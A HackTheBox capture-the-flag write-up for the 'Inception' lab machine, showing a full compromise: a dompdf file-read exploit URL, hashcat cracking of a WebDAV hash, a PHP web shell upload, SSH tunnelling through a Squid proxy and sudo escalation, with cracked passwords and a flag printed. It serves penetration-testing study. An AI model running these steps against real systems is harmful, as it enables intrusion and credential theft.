# Inception
#### 10.10.10.67
###### Dotaplayer365

Nmap
```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
```

We have a webserver which has some tempelate.

The dude tried to be smart by adding a lot of spaces to add a note, luckily i use curl for first stage enum

I find something like this

```
root@kali:~/hackthebox/Machines/Inception# curl http://inception.htb
<!DOCTYPE HTML>
<!--
	Eventually by HTML5 UP
..
..
..
<!-- Todo: test dompdf on php 7.x -->
```

If he wants to test dompdf, there has gotta be a dompdf folder right ??!!

Hell yeah there is

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Website.PNG"></kbd>

What do we do when we find some webapp ?

Yeah! we searchsploit it and hope we hit the motherload. For that we need the version. Its 0.6.0 

```root@kali:~/hackthebox/Machines/Inception# searchsploit dompdf```

| Exploit Title                                                   |  Path                       |
|:-------------------------:                                      |:-------------------------:  |
|TYPO3 ke DomPDF Extension - Remote Code Execution                | php/webapps/35443.txt       |
|dompdf 0.6.0 - 'dompdf.php' 'read' Parameter Arbitrary File Read | php/webapps/33004.txt       |
|dompdf 0.6.0 beta1 - Remote File Inclusion                       | php/webapps/14851.txt       |

Feelsgoodman

We use the **33004.txt** and we craft a weburl whcih would look like this

```
http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

This url should give us a pdf file which would have a base64 encoded /etc/passwd file

Lets try

It does give us a pdf, and after simply catting the pdf we can see the base64

```
root@kali:~/hackthebox/Machines/Inception# echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

Alright! so the exploit works, time to find some juicy stuff.

We check the apache2.conf, and it has nothing, but it says that there is ports.conf as well

We check that and it doesnt have anythiong specific but it has something which i had totally forgotten to check!!
```
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf
```

After checking the ```/etc/apache2/sites-enabled/000-default.conf``` we find something interesting
```
	<Location /webdav_test_inception>
		Options FollowSymLinks
		DAV On
		AuthType Basic
		AuthName "webdav test credential"
		AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
		Require valid-user
	</Location>
```

We check the ```/var/www/html/webdav_test_inception/webdav.passwd```
```
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

We crack the hash
```hashcat -m 1600 -a 0 hash.txt /home/pak/rockyou.txt```


After cracking the has we get the password as babygurl69

| Username      | Password                    	|
| -------------	|:-------------------------:  	|
| webdav_tester	| babygurl69       		|


Now that we got the username and password we can login to ``` http://10.10.10.67/webdav_test_inception```

But then what ?!! 

Gotta do some old school dissection for webdav

Cadaver
```
root@kali:~/hackthebox/Machines/Inception# cadaver http://inception.htb/webdav_test_inception
Authentication required for webdav test credential on server `inception.htb':
Username: webdav_tester
Password: 
dav:/webdav_test_inception/> 
```

Works like a charm.

From doing the machine **Bashed** we saw a really beautiful online php bash shell for usage 
[Arrexel's phpbash](https://github.com/Arrexel/phpbash)

We upload that using cadaver and visit the page

```
dav:/webdav_test_inception/> put dotalol.php
Uploading dotalol.php to `/webdav_test_inception/dotalol.php':
Progress: [=============================>] 100.0% of 4687 bytes succeeded.
```

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Website.PNG"></kbd>

We see a wordpress folder which has a config file with some really really juicy creds :D

```
www-data@Inception
:/var/www/html/wordpress_4.8.3# cat wp-config.php

/**
* The base configuration for WordPress
..
..
..
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```

And we also see the user ```cobb``` in the home folder, lets try the password for cobb!

We do a little enum and see that we might be able to use the squid proxy to connect to the ssh port 22

We use proxy tunnel to route our traffic through the squid port

Learn that when i was doing a Vulnhub machine : 
[Link to the vulnhub machine writeup](https://highon.coffee/blog/skytower-walkthrough/)

Setup tunnel with proxytunnel:
```
root@kali:~/hackthebox/Machines/Inception# proxytunnel -p 10.10.10.67:3128 -d 127.0.0.1:22 -a 4444
```

Now on another terminal - SSH through the HTTP tunnel:

Enter the password as ```VwPddNh7xMZyDQoByQL4``` and we are in

```
root@kali:~/hackthebox/Machines/Inception# ssh cobb@127.0.0.1 -p 4444 "/bin/bash"
The authenticity of host '[127.0.0.1]:4444 ([127.0.0.1]:4444)' can't be established.
ECDSA key fingerprint is SHA256:dr5DOURssJH5i8VbjPxvbeM+e2FyMqJ8DGPB/Lcv1Mw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:4444' (ECDSA) to the list of known hosts.
cobb@127.0.0.1's password: 
id
uid=1000(cobb) gid=1000(cobb) groups=1000(cobb),27(sudo)
python3 -c 'import pty;pty.spawn("/bin/bash")'
cobb@Inception:~$ 
```

We always check ```sudo -l``` ofcourse

```
cobb@Inception:~$ sudo -l
sudo -l
[sudo] password for cobb: VwPddNh7xMZyDQoByQL4

Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```

Say Whaaaaat! we can just ```sudo -i``` now and we got root shell

In all that excitement, we forgot to get the user.txt :D
```
root@Inception:/home/cobb# cat user.txt
cat user.txt
4a8bc2d686d093f3f8ad1b37b191303c
```

```
root@Inception:~# cat root.txt
cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```

Such Inception much wow !






```
IMAGE:
<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Website.PNG"></kbd>


TABLE:

| IP                  | FQDN                        |
| -------------       |:-------------------------:  |
| 10.10.10.65:443     | calvin.ariekei.htb          |
| 10.10.10.65:443     | beehive.ariekei.htb         |
```
